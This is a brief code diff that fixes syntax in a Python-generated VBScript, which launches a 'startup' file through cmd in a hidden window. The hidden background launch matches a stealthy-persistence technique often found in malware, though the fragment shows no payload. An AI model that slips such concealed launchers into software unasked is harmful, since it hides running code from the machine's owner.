@@ -19,9 +19,9 @@ def init():
     # create another file to run the startup script in bg
     with open(silencer_file, "w+") as silencer:
         the_shell = f"""
-        Set onShell = CreateObject ("Wscript.Shell")
+        Set onShell = CreateObject("Wscript.Shell")
         Dim strArgs
-        strArgs = "cmd /c {sartup_file}
+        strArgs = "cmd /c {sartup_file}"
         onShell.Run strArgs, 0, false
         """
         silencer.write(the_shell)
